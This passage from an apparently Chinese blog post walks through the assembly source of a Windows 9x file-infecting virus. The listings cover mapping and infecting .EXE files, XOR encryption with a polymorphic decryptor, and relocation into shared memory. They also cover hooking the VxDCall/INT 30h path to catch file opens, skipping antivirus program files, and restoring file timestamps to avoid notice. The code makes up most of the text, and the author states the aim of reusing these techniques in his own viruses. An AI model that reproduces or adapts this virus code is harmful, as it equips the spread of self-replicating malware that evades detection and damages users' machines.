  mov   [esi + hHostFile], eax       ;成功保存文件句柄  

;得到文件时间  

  lea   ebx, [esi + ftLastAccessTime]  

  lea   ecx, [esi + ftLastWriteTime]  

  call   esi + GetFileTime, eax, NULL, ebx, ecx  

;计算新文件大小  

  call   esi + GetFileSize, [esi + hHostFile], NULL  

  add   eax, [oamf_dwAddBytes]       ;计算新文件大小  

;映射文件  

  call   esi + CreateFileMappingA, [esi + hHostFile], NULL, PAGE_READWRITE, \  

     0, eax, NULL  

  test   eax, eax         ;创建映射文件是否成功  

  jz   Error_OpenAndMapFile_Mapping      

  mov   [esi + hMappedFile], eax     ;成功，保存句柄  

  call   esi + MapViewOfFile, eax, FILE_MAP_ALL_ACCESS, 0, 0, 0  

  mov   [esi + lpHostFile], eax    

  test   eax, eax    

  jnz   End_OpenAndMapFile          

  call   esi + CloseHandle, [esi + hMappedFile]         ;失败关闭映射文件，保存文件属性  

Error_OpenAndMapFile_Mapping:  

  call   esi + CloseHandle, [esi + hHostFile]         ;失败关闭文件  

Error_OpenAndMapFile_Create:  

  call   esi + SetFileAttributesA, oamf_szFileName, [esi + dwFileAttributes]  

  xor   eax, eax         ;设置文件属性错误，返回 0  

End_OpenAndMapFile:  

  ret  

OpenAndMapFile ENDP  
```

接下来程序又调用了加密病毒代码的函数 `EncryptVirus`，并使用了简单的多态，如下所示

```asm
EncryptVirus   PROC  

  push   edi                ;保存病毒代码的开始位置  

                  ;得到加密密钥进行加解密  

  ;@DELTA esi  

                  ;调用 esi + GetTickCount 得到随便数并存放在 EAX 中  

  in al, 40h                  ;得到随机密钥  

  IF DEBUG  

    xor al, al              ;如果在调试状态，则不加密  

  ENDIF  

  mov   ecx, ENCRYPTED_SIZE  

  add   edi, LOADER_SIZE           ;不加密  

EncryptByte:  

  xor   byte ptr [edi], al         ;加密  

  inc   edi  

  loop   EncryptByte  

  pop   edi                ;重置病毒代码的加密位置  

  mov   byte ptr [edi + EncryptionKey - StartOfVirusCode], al  

(*)  call   MutateDecryptor          ;调用多态进行解密  

  ret  

EncryptVirus ENDP  
```

接下来看看 `MutateDecryptor` 函数是怎么样多态的？

```asm
MutateDecryptor   PROC  

;得到两个随机寄存器  

(*)  call   RandomRegister                 ;得到第一个寄存器数据  

  mov   ah, al                 ;保存  

GetAnotherRegister:  

  call   RandomRegister                 ;得到第二个寄存器数据  

  cmp   ah, al                 ;是否和第一个相同  

  je   GetAnotherRegister             ;相同，则去得到另一个寄存器，循环  

;解密使用新的寄存器  

  mov   bl, 58h                  ;修改 pop  

  add   bl, al                  ;Register 1  

  mov   byte ptr [edi + 5], bl  

  mov   bl, 0C0h                 ;修改 add  

  add   bl, al                  ;Register 1  

  mov   byte ptr [edi + 7], bl  

  mov   bl, 0B8h                 ;修改 mov  

  add   bl, ah                  ;Register 2  

  mov   byte ptr [edi + 9], bl  

  mov   bl, 30h                 ; 修改 xor  

  add   bl, al                  ;Register 1  

  mov   byte ptr [edi + 15], bl  

  mov   bl, 40h                 ;修改 inc  

  add   bl, al                  ;Register 1  

  mov   byte ptr [edi + 17], bl  

  mov   bl, 48h                 ;修改 dec  

  add   bl, ah                  ;Register 2  

  mov   byte ptr [edi + 18], bl  

  ret  

MutateDecryptor ENDP  

RandomRegister PROC  

NewRandom:  

  in   al, 40h                  ;得到随机数  

  and   al,00000111b                  ;最大值为 7  

  cmp   al, 4                  ;不能为 4  

  je   NewRandom  

  cmp   al, 5                  ;也不能为 5  

  je   NewRandom  

  ret  

RandomRegister ENDP  
```

这个我们病毒的加密与解密也分析完了，重新回来 `InfectFile` 函数中，看最后一个调用的函数 `UnmapAndCloseFile`

```asm
UnmapAndCloseFile PROC uacf_szFilename:DWORD  

;Unmap File  

  @DELTA esi  

  call   esi + UnmapViewOfFile, [esi + lpHostFile]         ;Unmap the File  

  call   esi + CloseHandle, [esi + hMappedFile]          ;Close File Mapping  

;Restore File Time  

  lea   eax, [esi + ftLastAccessTime]  

  lea   ebx, [esi + ftLastWriteTime]  

  call   esi + SetFileTime, [esi + hHostFile], NULL, eax, ebx  

;Close File  

  call   esi + CloseHandle, [esi + hHostFile] ;Close the File  

;Restore File Attributes  

  call   esi + SetFileAttributesA, uacf_szFilename, [esi + dwFileAttributes]  

  ret  

UnmapAndCloseFile ENDP  
```

这个函数我就不多说了，就是完成感染后的收尾，恢复工作吧了

这样我们的主程中的感染函数就到这里了，其实很简单就是给文件新增加了一个节用于存放病毒，并使用了简单的多态对病毒代码部分进行加密处理

重新回来主程序中，感染之后，我们又调用了(4)`CanMachineBeInfected`，这个函数用于判断本台机器是否已经被感染过

```asm
CanMachineBeInfected PROC  

  @DELTA   esi  

;Check if the "No Infect" file exists on the current machine  

  mov   eax, esi  

  add   eax, offset szNoInfectFileName  

  call   esi + CreateFileA, eax, GENERIC_READ, FILE_SHARE_READ, NULL, \  

     OPEN_EXISTING, NULL, NULL  

  cmp   eax, INVALID_HANDLE_VALUE             ;文件是否被打开  

  je   End_CanMachineBeInfected            

;Close the file, and return 0, since its probably my machine  

  call   esi + CloseHandle, eax  

  xor   eax, eax              ;返回 0，没有被感染  

End_CanMachineBeInfected:  

  ret  

CanMachineBeInfected ENDP  
```

检查完机器是否感染之后，就调用(5)`RelocateVirus`，将病毒代码放在一个重置地址处,在这里是存放在一个公享内存区

```asm
RelocateVirus   PROC  

  LOCAL   dwDeltaOffset:DWORD, \  

    dwMemoryRegion:DWORD  

  @DELTA   esi  

  mov   [dwDeltaOffset], esi  

;重新保存内存地址  

  @DELTA   esi  

  call   esi + VxDCall, PageReserve, PR_SHARED, VIRUS_SIZE_PAGES, \  

    PC_WRITEABLE OR PC_USER  

  cmp   eax, INVALID_HANDLE_VALUE             ;分配内存  

  je   Error_RelocateVirus               

  cmp   eax, SHARED_MEMORY             ;是否是共享内存段  

  jb   Error_RelocateVirus               

;保存区域地址  

  mov   [dwMemoryRegion], eax  

;共享内存  

  shr   eax, 0Ch              ;页数据  

  mov   esi, [dwDeltaOffset]  

  call   esi + VxDCall, PageCommit, eax, VIRUS_SIZE_PAGES, PD_ZEROINIT, 0, \
```



`PC_WRITEABLE OR PC_USER OR PC_PRESENT OR PC_FIXED`

`or eax, eax`

`je Error_RelocateVirus`

; 拷贝病毒

`mov esi, dwDeltaOffset`

`add esi, offset StartOfVirusCode` ; 从这里开始拷贝源地址

`mov edi, [dwMemoryRegion]` ; 拷贝到这里来目标地址

`mov ecx, VIRUS_SIZE` ; 长度

`rep movsb`

`mov eax, [dwMemoryRegion]` ; 返回被分配的共享区域

`jmp End_RelocateVirus`

`Error_RelocateVirus:`

`xor eax, eax`

`End_RelocateVirus:`

`ret`

`RelocateVirus ENDP`

最后在主程序中，调用了(6)`InstallHookProcedure` 来 HOOK API 用来监听 `VxDCall` 调用的 API 函数，我们来看看这个函数吧

`InstallHookProcedure PROC`

`LOCAL dwDeltaOffset:DWORD`

`@DELTA esi`

`mov [dwDeltaOffset], esi`

; 修改 JMP 指令, 指向 `OldInt30` 地址

`mov eax, esi`

`add eax, offset OldInt30Address` ; 修改字节

`mov ebx, esi`

`add ebx, offset OldInt30` ; `OldInt30` 的直址

`mov [eax], ebx` ; 修改 JMP 指令

; 反汇编 `VxDCall` 函数如下:

;

; `8B 44 24 04 MOV EAX, DWORD PTR [ESP+04h]`
; `8F 04 24 POP DWORD PTR [ESP]`
; `2E FF 1D XX XX XX XX CALL FWORD PTR CS:[XXXXXXXX]`

;

; 先保存原来的 `OldInt30` 地址，然后修改 JMP 地址，使它跳到我们的地址处，然后在根据保存的原来的值，返回

`add esi, offset VxDCall`

`mov esi, [esi]` ; `VxDCall` 函数第一个字节

`mov ecx, 50` ; 扫描 50 个字节

`TraceVxDCall:`

`lodsb` ; 得到当前字节

`cmp al, 2Eh` ; 第一个字节是否是 CALL

`jne TraceVxDCall_NextByte` ; 不是，则检查下一个

`cmp word ptr [esi], 1DFFh` ; 然后检查指令下两个字节

`je TraceVxDCall_AddressFound`

`TraceVxDCall_NextByte:`

`loop TraceVxDCall` ; 继续检查

`TraceVxDCall_AddressFound:`

; 保存当前 INT 30h 地址

`cli` ; 不能避免被中断

`lodsw` ; 跳过 FF 1D

`lodsd` ; 指向 INT 30h instruction, `XXXXXXXX`

`mov esi, eax` ; 从这拷内字节

`mov edi, [dwDeltaOffset]`

`add edi, offset OldInt30` ; 到这里来

`mov ecx, 6` ; 保存 6 个字节

`rep movsb`

; 设置新的 INT 30h 句柄

`mov edi, eax` ; 指向 INT 30h instruction

`mov eax, [dwDeltaOffset]`

`add eax, offset VxDInt30Handler` ; 拷贝这个地址

`stosd` ; 保存四个字节

`mov ax, cs`

`stosw`

`sti` ; 句柄安装完成允许中断

`ret`

`InstallHookProcedure ENDP`

这面这段代码是 Hook API 经典之作吧,好多 Hook API 都会用到上面的技术~驱动中用的也比较多

其实原理很简单就是，当我们正常执行跳转时，修改要跳转的那几个字节，把它指向我们要他跳转的地址，然后又通过前面保存的修改的那个地方的地址，返回来，继续执行

下面我们分析，他 Hook 之后去执行了函数吧

`VxDInt30Handler PROC`

`pushad` ; 保存所有寄存器值

; 确保我们不是处理自己的调用

`@OFFSET ebp, VxDCall_Busy`

`cmp byte ptr [ebp], TRUE` ; 病毒是否正在运行之中

`je Exit_VxDInt30Handler`

; Process only INT 21h Services

`cmp eax, VWIN32_Int21Dispatch` ; 是否是 INt 21h

`jne Exit_VxDInt30Handler`

`mov eax,dword ptr [esp+0000002Ch]` ; 得到 21h

`cmp ax, RESIDENCY_CHECK_SERVICE` ; 检查是否驻留

`je Residency_Check`

`cmp ax, LFN_OPEN_FILE_EXTENDED`

`je Extended_File_Open`

`jmp Exit_VxDInt30Handler` ; 没有，则转到默认处理处

`Residency_Check:`

; Virus Residency Check

`popad` ; 保存寄存器和堆栈

`mov esi, RESIDENCY_SUCCESS` ; 告诉调用者，已经驻留了

`jmp Original_VxDInt30Handler` ; 去执行一般的处理

`Extended_File_Open:`

; 被重新载入

`@OFFSET eax, VxDCall_Busy`

`mov byte ptr [eax], TRUE`

`push esi`

(*) `call IsFilenameOK, esi`

`pop esi`

`or eax, eax`

`jz File_Not_Executable`

; Do Stuff

(*) `call OutputFileName`

`File_Not_Executable:`

; 完成处理

`@OFFSET eax, VxDCall_Busy`

`mov byte ptr [eax], FALSE`

`Exit_VxDInt30Handler:`

`popad` ; 保存，在转换之前

`Original_VxDInt30Handler:`

; 将接下来的几个字节转变为 `JMP FWORD PTR CS:[00000000]`

`DB 2Eh, 0FFh, 2Dh` ; 跳到 FWORD PTR CS:[XXXXXXXX]

`OldInt30Address:` ; 后面的四个字节将被代替 the

`DB 4 DUP (0)` ; `OldInt30` 在内存中的地址

`; ret ; 如果不需要，我们就跳走`

`VxDInt30Handler ENDP`

这个函数中调用了两个子函数，(*)`IsFilenameOK` 来判断文件是否被感染

判断原则：

(1)文件名不能少于五个字节，因为我们要感染`.EXE`文件，所以最小的长为也要五个字节

(2)文件的后缀名应该为`.EXE`(或`.XYZ` for 调试)

(3)文件不能包含 `viz,AV,AN,F-`这些常字符串，他们会阻止感染

`IsFilenameOK PROC ife_szFilename`

`LOCAL szExtention[4]:BYTE`

; 检查文件名长度

`mov esi, ife_szFilename`

(*) `call StringLength, esi` ; 得到文件名长度

`cmp eax, 4` ; 如果文件名长度小于 5 个字节

`jl Error_IsFilenameOk` ; 是的，不感染

`push eax` ; 保存文件长度

; Get File Extention

`mov eax, [esi + eax - 4]` ; 文件扩展名(包含.)

`lea edx, szExtention` ; 得到扩展缓冲区地址

`mov [edx], eax` ; 存储扩展缓冲区地址

; Convert to upper case

`mov ecx, 3` ; 三个字符被转换

`ToUpperCase:`

`inc edx` ; .字符不检查大小写

`cmp byte ptr [edx], "a"`

`jl NextCharacter`

`cmp byte ptr [edx], "z"`

`jg NextCharacter`

`sub byte ptr [edx], "a" - "A"` ; 转换为小写

`NextCharacter:`

`loop ToUpperCase`

`pop ecx` ; 得到文件名长度

; Check the Extention

`IF DEBUG`
`cmp dword ptr [edx - 3], "ZYX."` ; 扩展名`.XYZ`，只在调试时
`ELSE`
`ERR "Release Mode, Executables will be Infected !!!"`
`cmp dword ptr [edx - 3], "EXE."` ; 判断扩展名是否为`.XYZ`，只要调试时
`ENDIF`

`jne Error_IsFilenameOk` ; 如果不是，则扩展名不相配

; Check Anti-Virus Program Files

`dec ecx` ; 检查两个字节，最后一个字节不为 reqd

`CheckAntiVirusFiles:`

`cmp word ptr [esi], "VA"` ; "AV"; for NAV (Norton), TBAV (ThunderByte)

`je Error_IsFilenameOk`

`cmp word ptr [esi], "va"`

`je Error_IsFilenameOk`

`cmp word ptr [esi], "-F"` ; "F-"; for F-PROT

`je Error_IsFilenameOk`

`cmp word ptr [esi], "NA"` ; "AN", for SCAN (McAfee), CLEAN

`je Error_IsFilenameOk`

`cmp word ptr [esi], "na"`

`je Error_IsFilenameOk`

`inc esi` ; 下一个字符

`loop CheckAntiVirusFiles` ; 检查所有的

`xor eax, eax`

`inc eax`

`jmp End_IsFilenameOk`

`Error_IsFilenameOk:`

`xor eax, eax`

`End_IsFilenameOk:`

`ret`

`IsFilenameOK ENDP`

上面有一个得到文件名长度的函数(*)`StringLength`，如下所示

`StringLength PROC sl_lpszString:DWORD`

`mov edi, sl_lpszString` ; 字符串

`xor ecx, ecx`

`dec ecx`

`xor eax, eax` ; 查找 NULL 字符串

`repne scasb` ; 查找结终符 NULL

`not ecx`

`dec ecx` ; 字符串长度

`mov eax, ecx` ; 返回字符串长度

`ret`

`StringLength ENDP`

在我们自定义跳转的函数 `VxDInt30Handler` 中还调用了一个(*)`OutputFileName` ，用于创建文件，并写入数据

; ------------------------------------------OutputFileName---------------------------------------------------------

`OutputFileName PROC`

`LOCAL dwFilename:DWORD, \`
`dwDeltaOffset:DWORD`

`mov [dwFilename], esi`

`@DELTA esi`

`mov [dwDeltaOffset], esi`

; 创建文件用于写入

`mov edx, [dwDeltaOffset]`

`add edx, offset szOutputFile`

`mov esi, 0BFF77ADFh`

`call esi, edx, GENERIC_READ OR GENERIC_WRITE, FILE_SHARE_READ, \`
`0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0`

`cmp eax, INVALID_HANDLE_VALUE`

`je End_OutputFileName`

; 到文件未尾

`push eax` ; 保存句柄

`mov esi, 0BFF7713Fh` ; 设置文件指针

`call esi, eax, 0, 0, 2`

`pop eax` ; 重新存储句柄

; 得到文个名长度



```asm
  push   eax                         ;保存句柄  

  mov    edx, [dwFilename]  

  mov    esi, 0BFF773ADh             ;lstrlen  

  call   esi, edx  

  mov    ebx, eax                   ;文件名长度  

  pop    eax                         ;重新存储句柄  

;写入文件  

  push   eax                         ;保存句柄  

  push   eax                         ;创造一个缓冲区 written  

  lea    ecx, [esp - 4]  

  mov    edx, [dwFilename]  

  mov    esi, 0BFF76FD5h                  ;写文件  

  call   esi, eax, edx, ebx, ecx, 0  

  pop    eax                         ;删除缓冲区  

  pop    eax                         ;重新存储文件句柄  

;关闭文件句柄  

  mov    esi, 0BFF7E064h  

  call   esi, eax  

End_OutputFileName:  

  ret  

OutputFileName ENDP  
```

这样一个程序就分析完成了，上面用了加密与简单的多态，还用于了 `HOOK` 技术用于监听，这些技术对于病毒的写作者来说应该用的还是比较多的，就看你怎么玩吧了~~。

好了，就分析到这，我们学习病毒的源代码，最主要是学习它的一些经典技术，然后用在我们的病毒中。对于病毒技术，我会一直研究学习下去，并会一直在看雪上发一些文章，算是自己的一些学习经历和一些心得吧~~呵呵~~。好了，有时间再继续吧！[](img/c1d8523a7842d7b67917c210ac6dcf18.jpg "微笑")

现在咱只是小菜一个，但只要咱坚持做下去，我相信咱会成为中国最具有潜力的病毒缔造者（只是爱好，不会做恶，这点大家可以放心）~~在这里给自己加油，打气~~[](img/c1d8523a7842d7b67917c210ac6dcf18.jpg "微笑")
